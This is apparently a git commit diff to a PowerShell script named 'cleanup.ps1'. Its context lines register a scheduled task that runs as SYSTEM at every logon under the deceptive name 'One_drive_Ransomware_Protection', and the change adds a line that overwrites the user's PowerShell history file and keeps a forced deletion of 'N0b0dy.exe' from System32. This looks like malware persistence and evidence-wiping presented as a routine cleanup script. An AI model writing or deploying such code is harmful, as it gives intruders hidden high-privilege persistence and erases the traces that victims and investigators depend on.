8bba490a5c30b8c57f520c675c5f5aa99749a8ea
Kylerainer09 <Mr.nobodyAl22SU@proton.me>
2025-12-01 09:00:16 +0000

    Update cleanup.ps1

--- cleanup.ps1
+++ cleanup.ps1
@@ -4,5 +4,7 @@ $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 # register scheduled task
 Register-ScheduledTask -TaskName "One_drive_Ransomware_Protection" -Action $action -Trigger $trigger -Principal $principal
-# self destruct
+# overweite powershell history
+Set-Content -Path "C:\Users\$Env:UserName\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value "Thats not gonna work"
+# remove exe
 Remove-Item -Path "C:\Windows\System32\N0b0dy.exe" -Force
